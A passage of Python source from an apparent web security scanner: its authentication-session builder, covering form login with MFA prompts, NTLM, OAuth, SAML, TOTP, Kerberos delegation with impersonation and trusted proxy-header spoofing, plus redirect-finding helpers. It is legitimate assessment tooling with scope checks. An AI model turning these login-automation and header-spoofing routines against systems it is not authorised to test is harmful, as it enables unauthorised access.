            # ── <textarea> tags ───────────────────────────────────────────────
            for _tam in _re6.finditer(
                    r'<textarea\b([^>]*)>(.*?)</textarea>', _fbody,
                    _re6.IGNORECASE | _re6.DOTALL):
                _ta_a  = _tam.group(1)
                _n_m   = _re6.search(r'\bname=["\']([^"\']+)["\']', _ta_a, _re6.IGNORECASE)
                _id_m  = _re6.search(r'\bid=["\']([^"\']+)["\']',   _ta_a, _re6.IGNORECASE)
                _ph_m  = _re6.search(r'\bplaceholder=["\']([^"\']+)["\']', _ta_a, _re6.IGNORECASE)
                if not _n_m:
                    continue
                _taname  = _n_m.group(1)
                _taid    = _id_m.group(1) if _id_m else ""
                _taph    = _ph_m.group(1) if _ph_m else ""
                _talabel = _label_map.get(_taid) or _label_map.get(_taname) or _taph or _taname
                _fields.append({
                    "name": _taname, "type": "text", "label": _talabel,
                    "value": _re6.sub(r'<[^>]+>', '', _tam.group(2)).strip(),
                    "checked": False, "options": [],
                })

            _interactive = [f for f in _fields if f["type"] in _INTERACTIVE]
            if _interactive and not _has_pw:
                forms.append({
                    "action": _action, "method": _method,
                    "hidden": _hidden, "fields": _interactive,
                })
        return forms

    # ── Post-login page handler ───────────────────────────────────────────────
    def _handle_post_login_page(initial_resp: "requests.Response") -> None:
        """
        After credential submission:
          1. Log the URL the server redirected to.
          2. Scan for error messages and warn if found.
          3. Detect any interactive forms (MFA, consent, security questions, etc.).
          4. Present those prompts to the user via terminal and wait for responses.
          5. Submit the completed form and repeat up to _POST_MAX_STEPS times.
        """
        import re as _re7, sys as _sys7

        _POST_MAX_STEPS = 6

        # CSS class names that typically contain error messages
        _ERR_CLS_PAT = _re7.compile(
            r'\b(?:error|danger|alert-danger|alert-error|form-error|is-invalid|'
            r'has-error|invalid-feedback|login-error|error-message|flash-error|'
            r'flash-danger|text-danger|text-error|validation-error)\b',
            _re7.IGNORECASE,
        )
        # Phrase patterns that indicate login failure
        _ERR_TEXT_PAT = _re7.compile(
            r'\b(?:'
            r'invalid\s+(?:password|credentials?|username|e?mail|login)'
            r'|incorrect\s+(?:password|credentials?|username|e?mail)'
            r'|(?:login|sign.?in|authentication)\s+(?:failed|unsuccessful|error|invalid)'
            r'|(?:password|credentials?)\s+(?:is\s+)?(?:wrong|incorrect|invalid)'
            r'|too\s+many\s+(?:failed\s+)?(?:attempts?|tries|logins?)'
            r'|account\s+(?:locked|suspended|disabled|blocked|not\s+found)'
            r'|user\s+not\s+found'
            r'|access\s+denied'
            r'|captcha\s+(?:required|failed|incorrect)'
            r')\b',
            _re7.IGNORECASE,
        )

        def _extract_errors(html: str) -> "list[str]":
            errs: list = []
            # Pass 1: elements whose class attribute contains error keywords
            for _m in _re7.finditer(
                    r'<(?:div|p|span|li|td|h[1-6]|section|aside|article|ul)\b[^>]*'
                    r'class=["\'][^"\']*(?:error|danger|invalid|warning|alert)[^"\']*["\'][^>]*>'
                    r'([\s\S]*?)'
                    r'</(?:div|p|span|li|td|h[1-6]|section|aside|article|ul)>',
                    html, _re7.IGNORECASE):
                txt = _re7.sub(r'<[^>]+>', ' ', _m.group(1))
                txt = _re7.sub(r'\s+', ' ', txt).strip()
                if 4 < len(txt) < 300 and txt not in errs:
                    if _ERR_CLS_PAT.search(_m.group(0)[:_m.group(0).index('>')]):
                        errs.append(txt)
            # Pass 2: fallback — scan stripped text for error phrases
            if not errs:
                _vis = _re7.sub(r'<[^>]+>', ' ', html)
                for _m in _re7.finditer(_ERR_TEXT_PAT, _vis):
                    _s = max(0, _m.start() - 60)
                    _e = min(len(_vis), _m.end() + 60)
                    ctx = _re7.sub(r'\s+', ' ', _vis[_s:_e]).strip()
                    if ctx and ctx not in errs:
                        errs.append(ctx)
            return errs

        _is_tty = _sys7.stdin.isatty()
        current_resp = initial_resp

        for _step in range(_POST_MAX_STEPS):
            if current_resp is None:
                break

            _url  = current_resp.url
            _html = current_resp.text

            # ── 1. Log landing / redirect URL ─────────────────────────────────
            if _step == 0:
                vc.log(f"[auth] Post-login landing URL: {_url}", "INFO")
            else:
                vc.log(f"[auth] Post-login step {_step + 1} URL: {_url}", "INFO")

            # ── 2. HTTP error status ───────────────────────────────────────────
            if current_resp.status_code in (401, 403):
                vc.log(
                    f"[auth] Server returned HTTP {current_resp.status_code} "
                    "after credential submission — authentication likely rejected",
                    "WARNING",
                )

            # ── 3. Error message detection ─────────────────────────────────────
            for _err in _extract_errors(_html):
                vc.log(f"[auth] Page error detected: {_err}", "WARNING")

            # ── 4. Interactive prompt detection ────────────────────────────────
            _forms = _find_interactive_forms(_html, _url)
            if not _forms:
                vc.log(f"[auth] Post-login page appears clean at: {_url}", "INFO")
                break

            if not _is_tty:
                vc.log(
                    f"[auth] Post-login page has {len(_forms)} interactive form(s) "
                    "but stdin is not a TTY — cannot prompt for input; "
                    "use --browser-auth for interactive sessions",
                    "WARNING",
                )
                break

            # ── 5. Present form to user ────────────────────────────────────────
            _form = _forms[0]
            vc.log(
                f"[auth] Post-login page requires input "
                f"({len(_form['fields'])} field(s)) — please respond below:",
                "INFO",
            )

            _filled: dict = dict(_form["hidden"])
            _radio_done: set = set()

            for _field in _form["fields"]:
                _ft    = _field["type"]
                _fn    = _field["name"]
                _flbl  = _field["label"] or _fn

                if _ft == "radio":
                    if _fn in _radio_done:
                        continue
                    _radio_done.add(_fn)
                    _opts = [f for f in _form["fields"] if f["name"] == _fn and f["type"] == "radio"]
                    _opt_labels = [o["label"] or o["value"] for o in _opts]
                    _ans = vc.prompt(
                        f"{_flbl} — select one",
                        prompt_type="text",
                        options=_opt_labels,
                    ).strip()
                    try:
                        _idx = int(_ans) - 1
                        _filled[_fn] = _opts[_idx]["value"] if 0 <= _idx < len(_opts) else _opts[0]["value"]
                    except (ValueError, IndexError):
                        _found_r = False
                        for _ro in _opts:
                            if (_ro["label"] or _ro["value"]).lower() == _ans.lower():
                                _filled[_fn] = _ro["value"]
                                _found_r = True
                                break
                        if not _found_r:
                            _filled[_fn] = _opts[0]["value"] if _opts else ""

                elif _ft == "checkbox":
                    _state = "checked" if _field["checked"] else "unchecked"
                    _ans = vc.prompt(
                        f"{_flbl} [{_state}] — check this box?",
                        prompt_type="confirm",
                        options=["Yes", "No"],
                    ).strip().lower()
                    if _ans not in ("no", "n", "2"):
                        _filled[_fn] = _field["value"] or "on"
                    # unchecked → omit from POST (standard HTML behaviour)

                elif _ft == "select":
                    _opts = _field.get("options", [])
                    _opt_labels = [_otxt for _, _otxt in _opts]
                    _ans = vc.prompt(
                        f"{_flbl} — select one",
                        prompt_type="text",
                        options=_opt_labels,
                    ).strip()
                    try:
                        _idx = int(_ans) - 1
                        _filled[_fn] = _opts[_idx][0] if 0 <= _idx < len(_opts) else (_opts[0][0] if _opts else "")
                    except (ValueError, IndexError):
                        _found_s = False
                        for _oval, _otxt in _opts:
                            if _otxt.lower() == _ans.lower():
                                _filled[_fn] = _oval
                                _found_s = True
                                break
                        if not _found_s:
                            _filled[_fn] = _opts[0][0] if _opts else ""

                elif _ft == "password":
                    _filled[_fn] = vc.prompt(f"{_flbl}", prompt_type="password")

                else:  # text, email, tel, number, search, otp, textarea
                    _filled[_fn] = vc.prompt(f"{_flbl}", prompt_type="text").strip()

            # ── 6. Submit completed form ───────────────────────────────────────
            vc.log(f"[auth] Submitting post-login form → {_form['action']}", "INFO")
            try:
                if _form["method"] == "get":
                    current_resp = sess.get(
                        _form["action"], params=_filled,
                        timeout=timeout, allow_redirects=True,
                    )
                else:
                    current_resp = sess.post(
                        _form["action"], data=_filled,
                        timeout=timeout, allow_redirects=True,
                    )
                vc.log(
                    f"[auth] → {current_resp.url} (HTTP {current_resp.status_code})",
                    "INFO",
                )
            except Exception as _e:
                vc.log(f"[auth] Post-login form submission failed: {_e}", "WARNING")
                break

    # ── Form Login ────────────────────────────────────────────────────────────
    if method in ("form_login", "form"):
        _configured_login_url = auth.get("login_url", "").strip()
        _base_target_url = (
            cfg.get("target_url", "") or
            (cfg.get("target_urls", [None]) or [None])[0] or ""
        ).rstrip("/")

        # 1. Resolve login URL: configured → discover from target
        if _configured_login_url:
            vc.log(f"[auth] Using configured login URL: {_configured_login_url}", "INFO")
            _login_url = _configured_login_url
        elif _base_target_url:
            _login_url = _discover_login_url(_base_target_url)
            if _login_url:
                # Persist so _login_post and _csrf_prefetch can use it
                auth["login_url"] = _login_url
            else:
                vc.log("[auth] No login form located — form_login cannot proceed", "WARNING")
                _login_url = ""
        else:
            _login_url = ""

        # 2. Walk through gate/checkbox/JS-nav pages to reach the real login form
        _login_post_called = False
        if _login_url:
            _stepped = _step_to_login_form(_login_url)

            # Sentinel: JS-driven button detected and --browser-auth is set
            if _stepped == "__BROWSER_AUTH__":
                _b_sess = _browser_assisted_login(
                    auth.get("login_url", "").strip() or _login_url)
                if _b_sess is not None:
                    return _b_sess
                return None

            _login_url = _stepped
            auth["login_url"] = _login_url

        # 2b. Guard: confirm the resolved URL actually contains a
        #     username/password form before attempting credential submission.
        #     This prevents false-positive auth on pages that have an
        #     affirmative button (e.g. "Login") but no credential fields.
        #
        #     Leniency rules:
        #       – If GET returns 4xx/5xx: skip the guard and proceed.
        #         Many server-side endpoints (.action, .do, .jsf, etc.) only
        #         serve HTML for GET; a 405/404 is NOT evidence there is no form.
        #       – If redirect occurs during GET: adopt the final URL.
        #       – Only block when GET returns 200 with NO password field.
        if _login_url:
            try:
                _guard_r = sess.get(_login_url, timeout=timeout, allow_redirects=True)
                if _guard_r.status_code >= 400:
                    vc.log(
                        f"[auth] Guard GET returned HTTP {_guard_r.status_code} for "
                        f"{_login_url} — proceeding without form verification",
                        "INFO",
                    )
                else:
                    _guard_p = _analyse_form_page(_guard_r.text, _guard_r.url)
                    if _guard_p.get("js_rendered_login"):
                        # Page is a JS-rendered login shell — automated submission
                        # is not possible; hand off to browser-auth.
                        _ba_url_for_guard = (
                            auth.get("login_url", "").strip() or _base_target_url)
                        if cfg.get("browser_auth") and not no_interactive:
                            vc.log(
                                f"[auth] JS-rendered login detected at guard — "
                                "falling back to browser-assisted login",
                                "INFO",
                            )
                            return _browser_assisted_login(_ba_url_for_guard)
                        if no_interactive:
                            vc.log(
                                f"[auth] JS-rendered login at guard — "
                                "skipping (automated call site)",
                                "INFO",
                            )
                            _login_url = ""
                        else:
                            # No --browser-auth flag — prompt interactively.
                            vc.log(
                                f"[auth] JS-rendered login page detected at {_login_url} "
                                "— automated form submission is not possible",
                                "WARNING",
                            )
                            _br_role_suffix_g = f" for role '{role_label}'" if role_label else ""
                            _br_choice_g = vc.prompt(
                                f"Open a browser window to complete login manually{_br_role_suffix_g}?",
                                prompt_type="confirm",
                                options=["Yes", "No"],
                                role=role_label,
                            ).strip()
                            if _br_choice_g.lower() in ("yes", "y", "1"):
                                return _browser_assisted_login(_ba_url_for_guard)
                            vc.log(
                                "[auth] Browser login declined — continuing without authentication",
                                "WARNING",
                            )
                            _login_url = ""
                    elif not _guard_p["login_form"]:
                        vc.log(
                            f"[auth] Resolved URL has no username/password form — "
                            f"cannot submit credentials ({_login_url})",
                            "WARNING",
                        )
                        _login_url = ""
                    elif _guard_r.url != _login_url:
                        _login_url = _guard_r.url
                        auth["login_url"] = _login_url
            except Exception as _ge:
                vc.log(f"[auth] Could not verify login form at {_login_url}: {_ge}", "WARNING")

        # 3. POST credentials, then handle any post-login pages
        if _login_url:
            vc.log(f"[auth] Submitting credentials to: {_login_url}", "INFO")
            _post_resp, _ = _login_post(_login_url)
            _login_post_called = True
            if _post_resp is not None:
                _handle_post_login_page(_post_resp)
        else:
            vc.log("[auth] Skipping credential submission — no login URL available", "WARNING")

        # ── Browser-auth fallback (within _build_auth_session scope) ─────────────
        # _browser_assisted_login is a closure defined in this function; it must be
        # called from here — it is NOT accessible after _build_auth_session returns.
        #
        # Case A: no login URL was located — credentials were never submitted.
        # Case B: credentials were submitted but the session carries no auth markers
        #         (wrong credentials path, JS-based session, etc.).
        #
        # If --browser-auth is set: open browser immediately.
        # If not set: prompt the user interactively (consistent with the JS-nav
        # escalation in _step_to_login_form).
        _ba_url = auth.get("login_url", "").strip() or _base_target_url
        if _ba_url:
            _ba_hdr_names = frozenset({
                "authorization", "x-auth-token", "x-api-key", "x-csrf-token",
                "x-access-token", "x-session-token", "token",
            })
            _ba_has_signal = (
                bool(sess.cookies)
                or any(k.lower() in _ba_hdr_names for k in sess.headers)
                or sess.auth is not None
            )
            _ba_needed = (not _login_post_called) or (not _ba_has_signal)
            if _ba_needed:
                if not _login_post_called:
                    vc.log(
                        "[auth] No login form located — browser-assisted login required",
                        "INFO",
                    )
                else:
                    vc.log(
                        "[auth] Credential submission produced no authenticated session — "
                        "browser-assisted login required",
                        "INFO",
                    )
                if cfg.get("browser_auth") and not no_interactive:
                    return _browser_assisted_login(_ba_url)
                if no_interactive:
                    vc.log(
                        "[auth] Login failed — skipping browser-auth (automated call site)",
                        "INFO",
                    )
                else:
                    # No --browser-auth flag — prompt interactively.
                    _ba_role_sfx = f" for role '{role_label}'" if role_label else ""
                    _ba_choice = vc.prompt(
                        f"Open a browser window to complete login manually{_ba_role_sfx}?",
                        prompt_type="confirm",
                        options=["Yes", "No"],
                        role=role_label,
                    ).strip()
                    if _ba_choice.lower() in ("yes", "y", "1"):
                        return _browser_assisted_login(_ba_url)
                    vc.log(
                        "[auth] Browser login declined — continuing without authentication",
                        "WARNING",
                    )

        # ── False-positive guard ───────────────────────────────────────────────
        # If credentials were never submitted, any cookies on sess were set by
        # probe/spider GETs — not by authentication.  Return None so the caller
        # correctly reports "Authentication failed" instead of seeing probe
        # cookies and reporting success.
        if not _login_post_called:
            return None

    # ── HTTP Basic ────────────────────────────────────────────────────────────
    elif method == "basic":
        user = auth.get("username", "")
        pw   = auth.get("password", "")
        if user:
            sess.auth = (user, pw)

    # ── HTTP Digest ───────────────────────────────────────────────────────────
    elif method == "digest":
        from requests.auth import HTTPDigestAuth
        user = auth.get("username", "")
        pw   = auth.get("password", "")
        if user:
            sess.auth = HTTPDigestAuth(user, pw)

    # ── NTLM ─────────────────────────────────────────────────────────────────
    elif method == "ntlm":
        user   = auth.get("username", "")
        pw     = auth.get("password", "")
        domain = auth.get("domain", "")
        if user:
            try:
                from requests_ntlm import HttpNtlmAuth  # type: ignore[import]
                ntlm_user = f"{domain}\\{user}" if domain else user
                sess.auth = HttpNtlmAuth(ntlm_user, pw)
            except ImportError:
                vc.err("[auth] NTLM requires: pip install requests-ntlm")

    # ── NTLMv2 + Channel Binding Token ────────────────────────────────────────
    elif method == "ntlm_v2":
        user   = auth.get("username", "")
        pw     = auth.get("password", "")
        domain = auth.get("domain", "").rstrip("\\").strip()
        if user:
            try:
                from requests_ntlm import HttpNtlmAuth  # type: ignore[import]
                ntlm_user = f"{domain}\\{user}" if domain else user
                try:
                    sess.auth = HttpNtlmAuth(ntlm_user, pw, send_cbt=True)
                except TypeError:
                    sess.auth = HttpNtlmAuth(ntlm_user, pw)
            except ImportError:
                vc.err("[auth] NTLMv2 requires: pip install requests-ntlm")

    # ── Bearer Token ─────────────────────────────────────────────────────────
    elif method in ("bearer", "token"):
        token = auth.get("auth_token", "").strip()
        if token:
            tt = auth.get("token_type", "Bearer").strip()
            sess.headers["Authorization"] = f"{tt} {token}"

    # ── JWT Bearer ────────────────────────────────────────────────────────────
    elif method == "jwt_bearer":
        token = auth.get("auth_token", "").strip()
        if token:
            sess.headers["Authorization"] = f"Bearer {token}"
        else:
            # No pre-issued token — POST credentials to obtain JWT (same as token_login)
            resp, _url = _login_post()
            if resp is not None:
                try:
                    body = resp.json()
                    token_path = auth.get("login_token_path", "access_token")
                    tok: object = body
                    for part in token_path.split("."):
                        tok = tok.get(part) if isinstance(tok, dict) else None
                    if not tok or not isinstance(tok, str):
                        for key in ("access_token", "token", "jwt", "id_token", "auth_token"):
                            if isinstance(body, dict) and key in body:
                                tok = body[key]
                                break
                    if tok and isinstance(tok, str):
                        sess.headers["Authorization"] = f"Bearer {tok}"
                except Exception:
                    pass

    # ── Session Cookie ────────────────────────────────────────────────────────
    elif method == "session_cookie":
        raw = auth.get("session_cookie", "").strip()
        for part in raw.split(";"):
            part = part.strip()
            if not part:
                continue
            if "=" in part:
                k, _, v = part.partition("=")
                sess.cookies.set(k.strip(), v.strip())
            else:
                sess.cookies.set(part, "")

    # ── Token Login ───────────────────────────────────────────────────────────
    elif method == "token_login":
        resp, _url = _login_post()
        if resp is not None:
            try:
                body = resp.json()
                token_path = auth.get("login_token_path", "token")
                tok: object = body
                for part in token_path.split("."):
                    tok = tok.get(part) if isinstance(tok, dict) else None
                if not tok or not isinstance(tok, str):
                    for k in ("token", "access_token", "jwt", "id_token", "auth_token"):
                        if k in body:
                            tok = body[k]
                            break
                if tok and isinstance(tok, str):
                    tt = auth.get("token_type", "Bearer").strip()
                    sess.headers["Authorization"] = f"{tt} {tok}"
            except Exception:
                pass

    # ── OAuth2 Client Credentials ─────────────────────────────────────────────
    elif method == "oauth2_client_creds":
        token_url     = auth.get("oauth_token_url", "")
        client_id     = auth.get("oauth_client_id", "")
        client_secret = auth.get("oauth_client_secret", "")
        scope         = auth.get("oauth_scope", "")
        if token_url and client_id:
            client_auth_method = auth.get("client_auth_method", "body").strip().lower()
            data: dict = {"grant_type": "client_credentials"}
            req_kwargs: dict = {"timeout": timeout}
            if client_auth_method == "basic":
                req_kwargs["auth"] = (client_id, client_secret)
            else:
                data["client_id"]     = client_id
                data["client_secret"] = client_secret
            if scope:
                data["scope"] = scope
            try:
                resp = sess.post(token_url, data=data, **req_kwargs)
                body = resp.json()
                access_token = body.get("access_token", "")
                if access_token:
                    tt = body.get("token_type", "Bearer")
                    sess.headers["Authorization"] = f"{tt} {access_token}"
            except Exception as exc:
                vc.err(f"[auth] OAuth2 client_credentials failed: {exc}")

    # ── OAuth 1.0a ────────────────────────────────────────────────────────────
    elif method == "oauth1a":
        consumer_key    = auth.get("oauth1_consumer_key", "").strip()
        consumer_secret = auth.get("oauth1_consumer_secret", "").strip()
        access_token    = auth.get("oauth1_access_token", "").strip()
        token_secret    = auth.get("oauth1_token_secret", "").strip()
        if consumer_key:
            try:
                from requests_oauthlib import OAuth1  # type: ignore[import]
                sess.auth = OAuth1(consumer_key, consumer_secret,
                                   access_token or None, token_secret or None)
            except ImportError:
                vc.err("[auth] OAuth1a requires: pip install requests-oauthlib")

    # ── SAML 2.0 Assertion POST ───────────────────────────────────────────────
    elif method == "saml_assertion":
        acs_url     = auth.get("saml_acs_url", "").strip()
        assertion   = auth.get("saml_assertion", "").strip()
        relay_state = auth.get("saml_relay_state", "")
        if assertion:
            if acs_url:
                try:
                    data = {"SAMLResponse": assertion}
                    if relay_state:
                        data["RelayState"] = relay_state
                    sess.post(acs_url, data=data, timeout=timeout, allow_redirects=True)
                except Exception as exc:
                    vc.err(f"[auth] SAML assertion POST failed: {exc}")
            else:
                sess.headers["Authorization"] = f"SAML {assertion}"

    # ── OIDC id_token ─────────────────────────────────────────────────────────
    elif method == "oidc_token":
        id_token = (auth.get("oidc_id_token") or auth.get("auth_token") or "").strip()
        if id_token:
            sess.headers["Authorization"] = f"Bearer {id_token}"

    # ── mTLS — mutual TLS client certificate ──────────────────────────────────
    elif method == "mtls":
        import os as _os
        cert_path = auth.get("mtls_cert", "").strip()
        key_path  = auth.get("mtls_key", "").strip()
        ca_bundle = auth.get("mtls_ca_bundle", "").strip()
        if cert_path and key_path:
            if _os.path.isfile(cert_path) and _os.path.isfile(key_path):
                sess.cert = (cert_path, key_path)
                if ca_bundle and _os.path.isfile(ca_bundle):
                    sess.verify = ca_bundle
            else:
                vc.err(f"[auth] mTLS cert/key file not found: {cert_path}, {key_path}")
        else:
            client_id = auth.get("username", "").strip()
            if client_id:
                sess.headers["X-Client-Cert"] = client_id

    # ── TOTP/HOTP MFA — form login + second factor ────────────────────────────
    elif method == "totp_mfa":
        totp_secret = auth.get("totp_secret", "").strip()
        mfa_field   = auth.get("totp_field", "otp")
        mfa_url     = auth.get("totp_mfa_url", "").strip()

        def _totp(secret: str, digits: int = 6, period: int = 30) -> str:
            import hmac as _hmac, hashlib as _hl, struct as _struct
            import time as _time, base64 as _b64
            key = _b64.b32decode(secret.upper().replace(" ", ""))
            t   = int(_time.time()) // period
            h   = _hmac.new(key, _struct.pack(">Q", t), _hl.sha1).digest()
            off = h[-1] & 0x0F
            code = (_struct.unpack(">I", h[off:off+4])[0] & 0x7FFFFFFF) % (10 ** digits)
            return str(code).zfill(digits)

        if totp_secret and not mfa_url:
            # Single-step login: submit credentials + OTP together
            for lu in _login_urls():
                try:
                    otp = _totp(totp_secret)
                    data = {
                        auth.get("login_username_field", "username"): auth.get("username", ""),
                        auth.get("login_password_field", "password"): auth.get("password", ""),
                        mfa_field: otp,
                    }
                    r = sess.post(lu, data=data, timeout=timeout, allow_redirects=True)
                    if r.status_code not in (401, 403):
                        break
                except Exception as exc:
                    vc.err(f"[auth] TOTP single-step login failed: {exc}")
        else:
            resp, _url = _login_post()
            if resp is not None and mfa_url and totp_secret:
                try:
                    sess.post(mfa_url, data={mfa_field: _totp(totp_secret)}, timeout=timeout)
                except Exception as exc:
                    vc.err(f"[auth] TOTP MFA step failed: {exc}")

    # ── WebAuthn probe ────────────────────────────────────────────────────────
    elif method == "webauthn_probe":
        sess.headers["X-WebAuthn-Token"] = "1"

    # ── API Key in Header ─────────────────────────────────────────────────────
    elif method == "apikey_header":
        key    = auth.get("api_key", "").strip()
        header = auth.get("api_key_header", "X-API-Key")
        if key and header:
            sess.headers[header] = key

    # ── API Key in Cookie ─────────────────────────────────────────────────────
    elif method == "apikey_cookie":
        key         = auth.get("api_key", "").strip()
        cookie_name = auth.get("api_key_cookie", "api_key")
        if key:
            sess.cookies.set(cookie_name, key)

    # ── Custom Credential Headers ─────────────────────────────────────────────
    elif method == "header_creds":
        hdrs = auth.get("custom_headers", {})
        if isinstance(hdrs, dict):
            sess.headers.update(hdrs)

    # ── Proxy Header / Trusted Forwarding ────────────────────────────────────
    elif method == "proxy_header":
        hname = auth.get("proxy_header", auth.get("proxy_header_name", "X-Forwarded-User"))
        hval  = auth.get("proxy_header_value", auth.get("username", ""))
        if hname and hval:
            sess.headers[hname] = hval

    # ── Kerberos / SPNEGO ─────────────────────────────────────────────────────
    elif method == "kerberos":
        try:
            from requests_kerberos import HTTPKerberosAuth, OPTIONAL  # type: ignore[import]
            sess.auth = HTTPKerberosAuth(mutual_authentication=OPTIONAL)
        except ImportError:
            vc.err("[auth] Kerberos requires: pip install requests-kerberos")

    # ── Kerberos S4U2Proxy Delegation ─────────────────────────────────────────
    elif method == "kerberos_delegation":
        try:
            from requests_kerberos import HTTPKerberosAuth, REQUIRED  # type: ignore[import]
            impersonate = auth.get("kerberos_impersonate", "")
            kw: dict = {"mutual_authentication": REQUIRED, "delegate": True}
            if impersonate:
                kw["principal"] = impersonate
            sess.auth = HTTPKerberosAuth(**kw)
        except ImportError:
            vc.err("[auth] Kerberos delegation requires: pip install requests-kerberos")

    elif method == "auto":
        # ── Auto / Unknown — try username+password methods in priority order ─────
        # Attempts each method that accepts a username and password, stops at the
        # first one that produces a session carrying authentication signals.
        # Priority order (web app / form-centric):
        #   1. form_login  — HTML form POST → session cookie (most common for web apps)
        #   2. token_login — POST credentials → JSON token response (modern web APIs)
        #   3. basic       — HTTP Basic Auth (RFC 7617)
        #   4. digest      — HTTP Digest Auth (RFC 7616)
        #   5. ntlm        — NTLM / Windows Integrated Auth (Active Directory)
        _auto_methods = ["form_login", "token_login", "basic", "digest", "ntlm"]
        _auto_hdr_names = frozenset({
            "authorization", "x-auth-token", "x-api-key", "x-csrf-token",
            "x-access-token", "x-session-token", "token",
        })

        def _auto_has_auth(s: "requests.Session") -> bool:
            return (bool(s.cookies)
                    or any(k.lower() in _auto_hdr_names for k in s.headers)
                    or s.auth is not None)

        _auto_succeeded = False
        for _auto_m in _auto_methods:
            vc.log(f"[auth:auto] Trying method: {_auto_m}", "INFO")
            _auto_cfg = copy.deepcopy(cfg)
            _auto_cfg["auth"] = copy.deepcopy(auth)
            _auto_cfg["auth"]["method"] = _auto_m
            _auto_cfg["browser_auth"] = cfg.get("browser_auth", False)
            try:
                _auto_sess = _build_auth_session(
                    _auto_cfg, auth_key, scope_hostnames, role_label=role_label)
                if _auto_sess is not None and _auto_has_auth(_auto_sess):
                    vc.log(
                        f"[auth:auto] Success with method '{_auto_m}' — "
                        "using this session", "SUCCESS")
                    return _auto_sess
                vc.log(f"[auth:auto] Method '{_auto_m}' produced no auth signal — skipping",
                       "INFO")
            except Exception as _auto_e:
                vc.log(f"[auth:auto] Method '{_auto_m}' error: {_auto_e} — skipping", "INFO")
        vc.log("[auth:auto] All username/password methods exhausted — no session established",
               "WARNING")
        return None

    # Transfer auth state (cookies + key headers) to a scoped session for scanning.
    # This lets login_url be on a different host while scan requests remain scope-enforced.
    if scope_hostnames is not None:
        scoped = _make_session(cfg, scope_hostnames)
        scoped.cookies.update(sess.cookies)
        for _hk, _hv in sess.headers.items():
            if _hk.lower() in ("authorization", "x-auth-token", "x-csrf-token",
                               "x-api-key", "cookie"):
                scoped.headers[_hk] = _hv
        if sess.auth is not None:
            scoped.auth = sess.auth
        sess = scoped

    return sess


# ─────────────────────────────────────────────
# URL helpers
# ─────────────────────────────────────────────
def _parse_target(url: str) -> dict:
    p = urllib.parse.urlparse(url)
    scheme   = p.scheme or "http"
    hostname = p.hostname or url
    port     = p.port or (443 if scheme == "https" else 80)
    is_https = scheme == "https"
    return {
        "url":      url.rstrip("/"),
        "scheme":   scheme,
        "hostname": hostname,
        "port":     port,
        "is_https": is_https,
        "host_port": f"{hostname}:{port}",
    }


def _url_rel_path(full_url: str, base_url: str) -> str:
    """Strip scheme+host+port from full_url using base_url's origin.
    Returns the path (e.g. '/admin') or '/' if full_url IS the base.
    Falls back to full_url unchanged if parsing fails or origin doesn't match."""
    try:
        origin = urllib.parse.urlparse(base_url)
        prefix = f"{origin.scheme}://{origin.netloc}"
        if full_url.startswith(prefix):
            rel = full_url[len(prefix):]
            return rel if rel else "/"
    except Exception:
        pass
    return full_url


def _same_origin(base_url: str, candidate: str) -> bool:
    try:
        b = urllib.parse.urlparse(base_url)
        c = urllib.parse.urlparse(candidate)
        return b.netloc == c.netloc
    except Exception:
        return False


def _normalize_url(base: str, href: str) -> "str | None":
    try:
        joined = urllib.parse.urljoin(base, href)
        p      = urllib.parse.urlparse(joined)
        if p.scheme not in ("http", "https"):
            return None
        return joined.rstrip("/") if not p.path or p.path == "/" else joined
    except Exception:
        return None


def _attach_redirect_hook(
    sess: "requests.Session",
    scope_hostnames: set,
    target: dict,
    out: "OutputManager",
    in_scope_new: list,
) -> None:
    """Attach a response hook that records redirect findings and queues in-scope targets."""
    def _hook(r, *args, **kwargs):
        if r.status_code not in (301, 302, 303, 307, 308):
            return
        loc = r.headers.get("Location", "")
        if not loc:
            return
        try:
            abs_loc = urllib.parse.urljoin(r.url, loc)
            p = urllib.parse.urlparse(abs_loc)
            if p.scheme not in ("http", "https"):
                return
            dest_host = p.hostname or ""
        except Exception:
            return
        key = (r.url, abs_loc)
        if key in _redirect_seen:
            return
        _redirect_seen.add(key)
        import hashlib as _hl
        _redir_hash = _hl.md5(f"{r.url}|{abs_loc}".encode()).hexdigest()[:8]
        _redir_rq, _redir_rp = _save_http_evidence(out, "recon", f"redirect_{_redir_hash}", r)
        _redir_files = f"{_redir_rq},{_redir_rp}"
        in_scope = dest_host in scope_hostnames
        if in_scope:
            _from_p   = urllib.parse.urlparse(r.url)
            _to_p     = urllib.parse.urlparse(abs_loc)
            _is_slash = (
                _from_p.netloc == _to_p.netloc
                and _from_p.query == _to_p.query
                and _from_p.fragment == _to_p.fragment
                and _from_p.path.rstrip("/") == _to_p.path.rstrip("/")
                and _from_p.path != _to_p.path
            )
            if _is_slash:
                _slash_dir = "added" if _to_p.path.endswith("/") else "removed"
                out.add_finding(
                    title="Internal Redirect: Trailing Slash Mismatch",
                    url=target["url"], port=target["port"], risk="INFO",
                    description=(
                        f"A {r.status_code} redirect was observed from {r.url} to {abs_loc}. "
                        f"The server {_slash_dir} a trailing slash to normalise the path. "
                        f"This is an internal redirect caused by a trailing slash mismatch "
                        f"between the requested URL and the canonical form expected by the server."
                    ),
                    output=f"From: {r.url}\nTo:   {abs_loc}\nStatus: {r.status_code}",
                    sources="fracture-redirect",
                    service=target["scheme"],
                    affected=r.url,
                    output_file=_redir_files,
                    owasp="A05:2025 Security Misconfiguration",
                    nist="SC-7",
                    remediation=(
                        "Ensure all internal links use the canonical URL form (with or without "
                        "trailing slash, consistently) to avoid unnecessary redirect chains. "
                        "This may also reveal inconsistencies in access control enforcement "
                        "between the redirect source and destination."
                    ),
                    http_code=r.status_code,
                )
            else:
                out.add_finding(
                    title="HTTP Redirect to In-Scope URL",
                    url=target["url"], port=target["port"], risk="INFO",
                    description=(
                        f"A {r.status_code} redirect was observed from {r.url} to {abs_loc}. "
                        f"The destination is within the assessed scope and has been queued for testing."
                    ),
                    output=f"From: {r.url}\nTo:   {abs_loc}\nStatus: {r.status_code}",
                    sources="fracture-redirect",
                    service=target["scheme"],
                    affected=r.url,
                    output_file=_redir_files,
                    owasp="A04:2025 Insecure Design",
                    nist="SC-7",
                    remediation=(
                        "Verify that this redirect is intentional and does not expose sensitive "
                        "paths or bypass access controls."
                    ),
                    http_code=r.status_code,
                )
            norm = abs_loc.rstrip("/")
            if norm not in in_scope_new:
                in_scope_new.append(norm)
            vc.log(f"[redirect] In-scope {r.status_code}: {r.url} → {abs_loc}", "INFO")
        else:
            out.add_finding(
                title="HTTP Redirect to External URL",
                url=r.url, port=target["port"], risk="INFO",
                description=(
                    f"A {r.status_code} redirect was observed from {r.url} to {abs_loc}. "
                    f"The destination is outside the assessed scope."
